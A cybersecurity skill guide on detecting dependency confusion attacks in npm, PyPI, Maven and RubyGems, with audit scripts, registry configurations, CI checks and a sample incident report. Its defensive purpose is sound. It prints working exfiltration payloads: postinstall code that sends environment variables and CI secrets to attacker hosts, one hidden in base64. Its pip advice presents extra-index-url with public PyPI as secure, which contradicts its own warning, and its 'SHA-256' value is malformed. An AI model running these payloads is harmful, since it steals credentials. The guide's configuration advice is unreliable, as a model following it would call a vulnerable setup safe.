---
name: detecting-dependency-confusion-attacks
description: >-
  Detects and prevents dependency confusion (namespace confusion) attacks where
  attackers publish malicious packages to public registries (npm, PyPI, RubyGems,
  Maven Central) using names that match internal private packages. When misconfigured
  package managers prioritize public over private registries, malicious packages get
  installed. Use when configuring CI/CD pipelines, auditing package manager configurations,
  investigating supply chain compromises, implementing scoped package strategies, or
  responding to suspicious install scripts. Covers 2026 attack campaigns including
  Mini Shai-Hulud (170+ npm packages), TanStack compromise, and Microsoft-documented
  reconnaissance payloads. Mapped to MITRE ATT&CK T1195.002 (Compromise Software
  Dependencies) and NIST CSF supply chain security controls.
domain: cybersecurity
subdomain: supply-chain-security
tags:
- dependency-confusion
- supply-chain
- npm
- pypi
- rubygems
- package-manager
- typosquatting
- malicious-packages
- software-composition-analysis
- sbom
version: "1.0"
author: dakshverma23
license: Apache-2.0
nist_csf:
- SR.1-01
- SR.1-02
- SR.2-01
- ID.SC-01
- ID.SC-02
mitre_attack:
- T1195.002
- T1195.001
---

# Detecting Dependency Confusion Attacks

## When to Use

- When configuring **CI/CD pipelines** that install dependencies from both private and public registries
- When **auditing existing package manager configurations** (.npmrc, .pypirc, pip.conf, Gemfile) for registry prioritization
- After **suspicious package installation** alerts from EDR, SIEM, or Socket.dev/Snyk showing unexpected network connections during `npm install` or `pip install`
- When **implementing scoped package strategies** for organizations with internal package registries (Artifactory, Nexus, GitHub Packages)
- During **M&A due diligence** assessing target company's supply chain security posture
- When investigating **build failures** caused by malicious install scripts (postinstall hooks, setup.py) that exfiltrate environment variables
- After **security researcher disclosure** of public packages mimicking your organization's internal namespace

**Do not use** for CVE-based vulnerability scanning (use Snyk, Dependabot); this skill focuses on namespace confusion and malicious package detection, not outdated dependencies.

## Prerequisites

- Access to **package manager configuration files** (.npmrc, .pypirc, pip.conf, Gemfile, pom.xml, build.gradle)
- List of **internal/private package names** used by your organization
- Access to **private package registry** (Artifactory, Nexus, npm Enterprise, Azure Artifacts, AWS CodeArtifact)
- **CI/CD pipeline logs** showing package installation steps
- **SBOM (Software Bill of Materials)** if available (CycloneDX, SPDX format)
- **Network monitoring logs** (optional) showing outbound connections during builds
- Knowledge of **scoped package naming** conventions (@orgname/package for npm)
- Socket.dev, Snyk, or equivalent **SCA tool** for behavioral analysis (optional but recommended)

## Workflow

### Phase 1: Identify Private Package Inventory

Build a complete list of internal packages that could be targeted:

```bash
# For npm: Extract internal packages from package-lock.json across repos
find . -name package-lock.json -exec jq -r '.packages | keys[]' {} \; | sort -u > internal_packages.txt

# For PyPI: Extract from requirements.txt files
find . -name requirements.txt -exec cat {} \; | grep -v "^#" | cut -d'=' -f1 | sort -u > internal_packages.txt

# For Maven: Extract from pom.xml
find . -name pom.xml -exec xmllint --xpath "//dependency/artifactId/text()" {} \; | sort -u > internal_packages.txt

# For RubyGems: Extract from Gemfile.lock
find . -name Gemfile.lock -exec grep "^    " {} \; | awk '{print $1}' | sort -u > internal_packages.txt
```


**Identify high-risk packages**:
- Packages with generic names (utils, helpers, config, common, core, internal, shared)
- Packages specific to your organization or product names
- Packages referenced in multiple repositories (high-value targets)

**Check public registries for name collisions**:
```bash
# Check if your internal package names exist on public npm
cat internal_packages.txt | while read pkg; do
  npm view "$pkg" version 2>/dev/null && echo "⚠️  COLLISION: $pkg exists on public npm"
done

# Check PyPI
cat internal_packages.txt | while read pkg; do
  pip index versions "$pkg" 2>/dev/null && echo "⚠️  COLLISION: $pkg exists on PyPI"
done

# Check RubyGems
cat internal_packages.txt | while read pkg; do
  gem list -r "^$pkg$" | grep -q "^$pkg " && echo "⚠️  COLLISION: $pkg exists on RubyGems"
done
```

**Red flag**: If any internal package name exists on public registries with publish dates **after** your internal package was created, investigate immediately.

### Phase 2: Audit Package Manager Configurations

Verify registry resolution order and scoping:

**npm (.npmrc)**:
```bash
# Check current npm registry configuration
npm config list

# Locate all .npmrc files (user, project, global)
# User:   ~/.npmrc
# Project: {project-root}/.npmrc
# Global: /etc/npmrc or C:\Program Files\nodejs\etc\npmrc

# Inspect registry configuration
cat ~/.npmrc
cat .npmrc

# Check for scoped registry configuration
npm config get @yourorg:registry
```

**Secure npm configuration** (.npmrc):
```ini
# Pin scoped packages to private registry
@yourorg:registry=https://npm.yourorg.com/
@yourorg:always-auth=true

# Force authentication for private registry
//npm.yourorg.com/:_authToken=${NPM_TOKEN}

# Optional: Disable fallback to public registry for scoped packages
# (requires all @yourorg/* packages to exist in private registry)
```

**Insecure patterns**:
```ini
# ❌ BAD: No scoping - public registry checked first
registry=https://registry.npmjs.org/

# ❌ BAD: Private registry with fallback to public
registry=https://npm.yourorg.com/
```

---

**PyPI (.pypirc, pip.conf)**:
```bash
# Locate configuration files
# pip.conf:  /etc/pip.conf, ~/.config/pip/pip.conf, {venv}/pip.conf
# .pypirc:   ~/.pypirc

cat ~/.pypirc
cat ~/.config/pip/pip.conf
```

**Secure PyPI configuration** (pip.conf):
```ini
[global]
index-url = https://pypi.yourorg.com/simple
extra-index-url = https://pypi.org/simple

# Trusted host (if using HTTP private registry)
trusted-host = pypi.yourorg.com

# Force only private registry (no fallback)
# index-url = https://pypi.yourorg.com/simple
# no-index = true  # Disable public PyPI entirely
```

**Insecure patterns**:
```ini
# ❌ BAD: Public PyPI first, private second
[global]
index-url = https://pypi.org/simple
extra-index-url = https://pypi.yourorg.com/simple
```

**Critical**: pip installs the **first package found** across all indexes. If a malicious package exists on pypi.org with higher version number, it wins.

---

**Maven (pom.xml, settings.xml)**:
```bash
# Check Maven settings
cat ~/.m2/settings.xml
cat pom.xml | grep -A10 "<repositories>"
```

**Secure Maven configuration** (pom.xml):
```xml
<repositories>
  <!-- Private repository FIRST -->
  <repository>
    <id>company-private</id>
    <url>https://maven.yourorg.com/repository</url>
    <releases><enabled>true</enabled></releases>
    <snapshots><enabled>false</enabled></snapshots>
  </repository>
  
  <!-- Maven Central as fallback -->
  <repository>
    <id>central</id>
    <url>https://repo.maven.apache.org/maven2</url>
    <releases><enabled>true</enabled></releases>
  </repository>
</repositories>
```

---

**RubyGems (Gemfile)**:
```ruby
# Secure Gemfile configuration
source 'https://gems.yourorg.com' do
  gem 'internal-package'
  gem 'company-utils'
end

# Public RubyGems for everything else
source 'https://rubygems.org' do
  gem 'rails'
  gem 'devise'
end
```

**Insecure pattern**:
```ruby
# ❌ BAD: Single source - checks public first
source 'https://rubygems.org'
gem 'internal-package'  # Will install from public if exists
```

### Phase 3: Detect Malicious Packages in Public Registries

Proactively search for squatted versions of your internal packages:

**Automated monitoring script** (detect_confusion.sh):
```bash
#!/bin/bash
# Monitors public registries for packages matching internal names

INTERNAL_PACKAGES="internal_packages.txt"
ALERT_WEBHOOK="https://slack.com/api/YOUR_WEBHOOK"

while IFS= read -r package; do
  # Check npm
  NPM_INFO=$(npm view "$package" --json 2>/dev/null)
  if [ $? -eq 0 ]; then
    VERSION=$(echo "$NPM_INFO" | jq -r '.version')
    AUTHOR=$(echo "$NPM_INFO" | jq -r '.author.name')
    PUBLISH_DATE=$(echo "$NPM_INFO" | jq -r '.time.created')
    
    # Check install scripts (common attack vector)
    HAS_SCRIPTS=$(echo "$NPM_INFO" | jq -r '.scripts | has("postinstall", "preinstall", "install")')
    
    if [ "$HAS_SCRIPTS" = "true" ]; then
      echo "🚨 ALERT: $package v$VERSION on npm has install scripts"
      echo "   Author: $AUTHOR | Published: $PUBLISH_DATE"
      curl -X POST "$ALERT_WEBHOOK" -d "{\"text\":\"⚠️ Dependency confusion risk: $package\"}"
    fi
  fi
  
  # Check PyPI
  PYPI_INFO=$(curl -s "https://pypi.org/pypi/$package/json")
  if echo "$PYPI_INFO" | jq -e '.info' > /dev/null 2>&1; then
    VERSION=$(echo "$PYPI_INFO" | jq -r '.info.version')
    AUTHOR=$(echo "$PYPI_INFO" | jq -r '.info.author')
    echo "🚨 ALERT: $package v$VERSION exists on PyPI"
    echo "   Author: $AUTHOR"
  fi
done < "$INTERNAL_PACKAGES"
```

**Manual investigation**:
```bash
# Download suspicious package for inspection
npm pack suspicious-package@1.2.3
tar -xzf suspicious-package-1.2.3.tgz
cd package/

# Check for malicious install scripts
cat package.json | jq '.scripts'

# Common malicious patterns in postinstall:
grep -r "curl" .
grep -r "wget" .
grep -r "process.env" .
grep -r "Buffer.from" .
grep -r "eval" .
grep -r "child_process" .

# Check for obfuscated code
find . -name "*.js" -exec grep -l "eval.*fromCharCode" {} \;
```

### Phase 4: Analyze Install Script Behavior

Inspect package install hooks for exfiltration payloads:

**Known malicious patterns (2026 campaigns)**:

**Mini Shai-Hulud campaign** (May 2026):
```javascript
// postinstall script in malicious @tanstack packages
const https = require('https');
const os = require('os');

const data = JSON.stringify({
  hostname: os.hostname(),
  user: os.userInfo().username,
  env: process.env,
  cwd: process.cwd()
});

https.request('https://attacker-c2.com/collect', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'}
}, () => {}).write(data);
```

**Microsoft-documented reconnaissance payload** (May 2026):
```javascript
// Obfuscated postinstall extracting CI secrets
const {exec} = require('child_process');
const b64 = "Y3VybCAtWCBQT1NUIC1kICQoZW52IHwgYmFzZTY0KQ==";
exec(Buffer.from(b64, 'base64').toString());
// Decoded: curl -X POST -d $(env | base64) https://oob.moika.tech
```

**Detection approach**:
```bash
# Extract and analyze all install scripts from package.json files
find node_modules/ -name package.json -exec jq -r '.scripts | select(.postinstall or .preinstall or .install)' {} \; > install_scripts.json

# Static analysis for suspicious APIs
grep -r "require.*child_process" node_modules/
grep -r "require.*https" node_modules/
grep -r "process\.env" node_modules/ | grep -v "NODE_ENV"

# Dynamic analysis with sandbox
# Use npm-sandbox or run in isolated Docker container with egress monitoring
docker run -it --network=monitor node:20-alpine sh
npm install suspicious-package --ignore-scripts=false
# Monitor network connections in separate terminal
```

### Phase 5: Implement Registry Prioritization Controls

Configure package managers to prevent public registry precedence:

**npm: Lock down scoped packages**:
```bash
# Step 1: Migrate all internal packages to scoped names
# Before: internal-utils
# After:  @yourorg/internal-utils

# Step 2: Configure .npmrc at repository root
cat > .npmrc << 'EOF'
@yourorg:registry=https://npm.yourorg.com/
//npm.yourorg.com/:_authToken=${NPM_TOKEN}
always-auth=true

# Block public registry for internal scope
@yourorg:registry=https://npm.yourorg.com/
EOF

# Step 3: Enforce .npmrc in CI/CD
# Ensure CI builds use the committed .npmrc and NPM_TOKEN is injected securely
```

**PyPI: Use --index-url with explicit ordering**:
```bash
# Force private registry priority in pip install
pip install --index-url https://pypi.yourorg.com/simple \
            --extra-index-url https://pypi.org/simple \
            -r requirements.txt

# Or configure permanently in pip.conf
mkdir -p ~/.config/pip/
cat > ~/.config/pip/pip.conf << 'EOF'
[global]
index-url = https://pypi.yourorg.com/simple
extra-index-url = https://pypi.org/simple
EOF

# Verify configuration
pip config list
```

**Maven: Mirror configuration in settings.xml**:
```xml
<settings>
  <mirrors>
    <mirror>
      <id>company-mirror</id>
      <name>Company Maven Repository</name>
      <url>https://maven.yourorg.com/repository</url>
      <mirrorOf>*</mirrorOf>
    </mirror>
  </mirrors>
</settings>
```

**RubyGems: Block specific gem sources**:
```ruby
# Gemfile with explicit sourcing
source 'https://gems.yourorg.com' do
  gem 'company-auth'
end

source 'https://rubygems.org' do
  gem 'rails'
end

# Prevent accidental cross-contamination
# This forces developer to explicitly move gems between sources
```

### Phase 6: Deploy Behavioral Monitoring

Implement runtime detection for malicious package behavior:

**Socket.dev integration** (recommended):
```bash
# Install Socket CLI
npm install -g @socketsecurity/cli

# Authenticate
socket login

# Scan dependencies before install
socket npm audit

# Block installation if threats detected
socket npm install --bail-on-threat

# Socket detects:
# - Network connections during install
# - Filesystem writes outside node_modules/
# - Shell command execution
# - Obfuscated code
# - Environment variable access
```

**Snyk integration**:
```bash
# Install Snyk CLI
npm install -g snyk

# Authenticate
snyk auth

# Test for vulnerabilities AND malicious packages
snyk test

# Monitor project continuously
snyk monitor

# Snyk catches:
# - Known malicious packages (crowdsourced IOCs)
# - Typosquatting attempts
# - Suspicious version patterns
```

**Manual network monitoring** (if commercial tools unavailable):
```bash
# Run npm install in network-monitored environment
# Option 1: Use Wireshark/tcpdump
tcpdump -i any -n 'tcp port 80 or tcp port 443' -w npm_install.pcap &
npm install
# Analyze pcap for unexpected destinations

# Option 2: Use HTTP proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
npm install
# Check proxy logs for suspicious POST requests with env data
```

### Phase 7: Establish Continuous Monitoring

Automate dependency confusion detection:

**CI/CD integration**:
```yaml
# GitHub Actions example
name: Dependency Confusion Check

on: [pull_request]

jobs:
  check-deps:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Check for public package collisions
        run: |
          # Extract all internal package names
          jq -r '.dependencies, .devDependencies | keys[]' package.json | \
          grep "^@yourorg/" | \
          while read pkg; do
            # Remove scope for public check
            public_name=${pkg#@yourorg/}
            if npm view "$public_name" version 2>/dev/null; then
              echo "::error::Collision detected: $pkg has unscoped public version"
              exit 1
            fi
          done
      
      - name: Socket Security Scan
        uses: SocketDev/socket-action@v1
        with:
          token: ${{ secrets.SOCKET_TOKEN }}
          fail-on-threat: true
      
      - name: Verify .npmrc configuration
        run: |
          if ! grep -q "@yourorg:registry" .npmrc; then
            echo "::error::Missing scoped registry configuration in .npmrc"
            exit 1
          fi
```

**SIEM alerting rules**:
```yaml
# Splunk/ELK detection rule for install script exfiltration
rule: Suspicious npm Install Network Activity
conditions:
  - process_name matches "npm|node"
  - process_cmdline contains "install"
  - network_connection.dest_port in [80, 443]
  - network_connection.dest_ip NOT IN [registry.npmjs.org, pypi.org, rubygems.org]
  - network_bytes_sent > 10000  # Env data exfiltration
severity: HIGH
action: alert_security_team
```

**Package registry monitoring**:
```python
# Monitor public registries for name squatting (monitor_squatting.py)
import requests
import json
from datetime import datetime, timedelta

INTERNAL_PACKAGES = ["company-auth", "company-utils", "company-db"]
SLACK_WEBHOOK = "https://hooks.slack.com/services/YOUR/WEBHOOK"

def check_npm_squatting():
    for pkg in INTERNAL_PACKAGES:
        response = requests.get(f"https://registry.npmjs.org/{pkg}")
        if response.status_code == 200:
            data = response.json()
            latest_version = data['dist-tags']['latest']
            publish_date = data['time'][latest_version]
            
            # Alert if published in last 7 days
            if datetime.fromisoformat(publish_date.replace('Z', '+00:00')) > \
               datetime.now().astimezone() - timedelta(days=7):
                alert_message = {
                    "text": f"🚨 New squatted package detected!\n"
                            f"Package: {pkg}\n"
                            f"Version: {latest_version}\n"
                            f"Published: {publish_date}"
                }
                requests.post(SLACK_WEBHOOK, json=alert_message)

if __name__ == "__main__":
    check_npm_squatting()
```

**Schedule monitoring**:
```bash
# cron job to check daily
0 9 * * * /usr/bin/python3 /opt/security/monitor_squatting.py
```

## Key Concepts

| Term | Definition |
|------|------------|
| **Dependency Confusion** | Attack exploiting package manager registry resolution where public packages with same name as private packages get installed due to misconfiguration or version precedence |
| **Namespace Confusion** | Alternative term for dependency confusion emphasizing exploitation of namespace collisions between private and public registries |
| **Scoped Packages** | npm naming convention (@orgname/package) that reserves namespace for specific npm user/organization, preventing public squatting |
| **Registry Prioritization** | Order in which package managers query multiple registries; misconfigured priority allows public malicious packages to supersede private legitimate ones |
| **Install Scripts** | Package manager hooks (postinstall, preinstall) that execute arbitrary code during dependency installation; common attack vector for exfiltration |
| **Typosquatting** | Publishing packages with names similar to popular packages (e.g., "reqeusts" instead of "requests") to trick developers into installing malicious code |
| **SBOM (Software Bill of Materials)** | Machine-readable inventory of software components and dependencies (CycloneDX, SPDX formats) enabling supply chain transparency |
| **Zero-Day Supply Chain Attack** | Malicious package published to registry before security vendors catalog it; behavioral analysis (Socket.dev) required for detection |
| **Package Provenance** | Cryptographic attestation linking published package to specific source code commit and build environment (SLSA, Sigstore) |

## Tools & Systems

- **Socket.dev**: Behavioral analysis SCA tool detecting malicious packages via install script monitoring, network calls, and filesystem writes; $1B valuation (May 2026)
- **Snyk Open Source**: CVE and malicious package scanner with proprietary vulnerability database and reachability analysis for Java/JavaScript/Python
- **Artifactory / Nexus**: Private package registry servers supporting npm, PyPI, Maven, NuGet with caching, access control, and audit logging
- **npm Enterprise / GitHub Packages**: Hosted private npm registries with scoped package namespace enforcement and SSO integration
- **Syft + Grype**: Open-source SBOM generator (Syft) and vulnerability scanner (Grype) by Anchore supporting container and filesystem scanning
- **Dependency-Track**: OWASP project for continuous SBOM analysis and vulnerability intelligence aggregation across multiple sources
- **OSV-Scanner**: Google's free CLI backed by OSV.dev database covering 13+ ecosystems including npm, PyPI, Maven, Go

## Common Scenarios

### Scenario: CI Pipeline Installing Malicious Package After Config Change

**Context**: After migrating from npm Enterprise to Artifactory, builds started failing with network timeouts. Investigation revealed `npm install` was downloading a package named `company-utils` from public npm registry instead of private Artifactory. The public package contained a postinstall script exfiltrating CI environment variables (including AWS credentials) to `oob.moika.tech`. Attack detected via AWS CloudTrail showing unauthorized S3 access from Romanian IP.

**Approach**:
1. **Immediate Response**: Revoke exposed AWS credentials, rotate all CI secrets, audit CloudTrail for unauthorized access scope
2. **Root Cause**: New Artifactory configuration omitted scoped package mapping; `.npmrc` had generic `registry=` instead of `@company:registry=`
3. **Investigation**: Download malicious `company-utils@1.4.7` from public npm, extract postinstall script showing exfiltration payload
4. **Remediation**: 
   - Rename all internal packages to scoped format (`@company/utils`)
   - Update `.npmrc`: `@company:registry=https://artifactory.internal/`
   - Add CI check blocking unscoped internal package references
   - Deploy Socket.dev to block future malicious installs
5. **Continuous Monitoring**: Schedule daily check for public packages matching `@company/*` namespace

**Pitfalls**:
- Not immediately revoking credentials (attacker maintains access)
- Only fixing CI config without renaming packages (vulnerability remains for developer machines)
- Failing to audit full blast radius (checking only S3; attacker may have accessed EC2, RDS)

---

### Scenario: Typosquatted Package Detected During Security Audit

**Context**: During annual supply chain audit, SBOM analysis revealed dependency `company-utilz` (note the 'z') in 12 microservices. No such package exists in internal registry. Public npm has `company-utilz@2.1.0` published 3 months ago with identical README to legitimate `company-utils`. Malicious package downloads AWS credentials from EC2 metadata service and beacons to C2.

**Approach**:
1. **Identify Affected Services**: `grep -r "company-utilz" */ --include=package.json` across all repos
2. **Assess Compromise Scope**: Check if affected services run on EC2 (metadata service accessible); review CloudTrail for anomalous API calls
3. **Emergency Patch**: Replace `company-utilz` with `@company/utils` in all package.json files; force reinstall dependencies
4. **Forensics**: Download malicious package for IOC extraction (C2 domains, API endpoints); add to threat intelligence feeds
5. **Preventive Controls**: 
   - Implement pre-commit hook rejecting unscoped `company-*` packages
   - Add Socket.dev GitHub Action to PR pipeline
   - Create internal typosquatting watchlist monitoring public registries

**Pitfalls**:
- Only fixing known instances without checking for other typosquats (`campany-utils`, `compnay-utils`)
- Not treating as security incident (no forensics, no credential rotation)

## Output Format

```
DEPENDENCY CONFUSION DETECTION REPORT
======================================
Organization:      YourCorp Engineering
Assessment Date:   2026-07-15
Auditor:           Security Team
Scope:             npm, PyPI, Maven packages across 47 repositories

PRIVATE PACKAGE INVENTORY
Total Internal Packages:    89
  - npm (scoped):           45 (@yourcorp/*)
  - npm (unscoped):         12 ⚠️  HIGH RISK
  - PyPI:                   28
  - Maven:                  4

PUBLIC REGISTRY COLLISIONS DETECTED
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. 🚨 CRITICAL: company-auth
   Public Registry:  npm
   Public Version:   1.2.3
   Publish Date:     2026-07-10 (5 days ago)
   Author:           unknown_user_2847
   Install Scripts:  YES (postinstall)
   Indicators:       Network call to 185.220.101.42, env access
   RECOMMENDATION:   Migrate to @yourcorp/auth IMMEDIATELY

2. 🚨 HIGH: internal-utils  
   Public Registry:  PyPI
   Public Version:   0.9.1
   Publish Date:     2026-06-20
   Author:           security_researcher_test
   Setup.py:         Contains os.environ access
   RECOMMENDATION:   Verify legitimate security researcher; migrate to scoped package

CONFIGURATION AUDIT RESULTS
━━━━━━━━━━━━━━━━━━━━━━━━━━━
Repository: backend-api
  .npmrc Status:     ❌ INSECURE
  Issue:             No scoped registry configuration
  Registry Order:    1) registry.npmjs.org  2) npm.yourcorp.com
  Risk Level:        CRITICAL
  Fix:               Add @yourcorp:registry=https://npm.yourcorp.com/

Repository: ml-pipeline
  pip.conf Status:   ❌ INSECURE  
  Issue:             Public PyPI prioritized over private
  Index Order:       1) pypi.org  2) pypi.yourcorp.com
  Risk Level:        HIGH
  Fix:               Reverse index-url order

Repository: frontend-web
  .npmrc Status:     ✅ SECURE
  Configuration:     @yourcorp:registry=https://npm.yourcorp.com/
  Registry Order:    Scoped packages to private only
  Risk Level:        LOW

MALICIOUS PACKAGE ANALYSIS
━━━━━━━━━━━━━━━━━━━━━━━━━━
Package:          company-auth@1.2.3 (npm)
SHA-256:          a3f5e9d8c7b6a5f4e3d2c1b0a9f8e7d6
Install Script:   postinstall.js

Deobfuscated Payload:
┌─────────────────────────────────────────────────
│ const https = require('https');
│ const data = JSON.stringify({
│   env: process.env,
│   cwd: process.cwd(),
│   packages: require('./package.json').dependencies
│ });
│ https.request('https://185.220.101.42/c2/collect', {
│   method: 'POST'
│ }, () => {}).write(data);
└─────────────────────────────────────────────────

IOCs Extracted:
  - C2 IP:        185.220.101.42
  - C2 Domain:    attacker-c2.example.com
  - Exfiltrated:  Environment variables, package list, filesystem paths

REMEDIATION ROADMAP
━━━━━━━━━━━━━━━━━━━
Priority 1 (0-48 hours):
  [ ] Rotate all CI/CD credentials (AWS, GitHub tokens, npm tokens)
  [ ] Remove public collision packages from internal dependency trees
  [ ] Deploy scoped package naming for all 12 unscoped internal packages
  [ ] Update .npmrc/.pypirc in all 47 repositories

Priority 2 (1-2 weeks):
  [ ] Deploy Socket.dev across CI/CD pipelines
  [ ] Implement pre-commit hooks blocking unscoped company-* packages
  [ ] Create daily monitoring job for public registry squatting
  [ ] Add SIEM alerting for npm/pip network anomalies

Priority 3 (1 month):
  [ ] Conduct SBOM audit for all production services
  [ ] Implement SLSA Build Level 2 for internal packages
  [ ] Security training for developers on dependency confusion
  [ ] Quarterly supply chain security audit

COMPLIANCE STATUS
━━━━━━━━━━━━━━━━━
NIST CSF SR.1-01 (Supply Chain Security):     ⚠️  PARTIAL
NIST CSF SR.2-01 (Supplier Assessments):      ❌ NON-COMPLIANT  
CIS Control 2.3 (Software Inventory):         ✅ COMPLIANT (SBOM present)
MITRE ATT&CK T1195.002 Detection:             ⚠️  PARTIAL (manual detection only)
```

## Verification Checklist

- [ ] All internal packages migrated to scoped names (@orgname/package)
- [ ] .npmrc contains scoped registry configuration with authentication
- [ ] pip.conf prioritizes private index-url before extra-index-url
- [ ] Maven settings.xml uses mirror or explicit repository order
- [ ] CI/CD pipelines inject package registry credentials securely (not hardcoded)
- [ ] Socket.dev or equivalent SCA tool deployed with --bail-on-threat
- [ ] Pre-commit hooks block unscoped internal package references
- [ ] Daily automated check for public packages matching internal namespace
- [ ] SIEM alerting configured for npm/pip network anomalies during install
- [ ] Incident response playbook includes dependency confusion scenario
- [ ] SBOM generated and monitored (CycloneDX/SPDX)
- [ ] Security training delivered to engineering on supply chain attacks
- [ ] Quarterly supply chain security audit scheduled

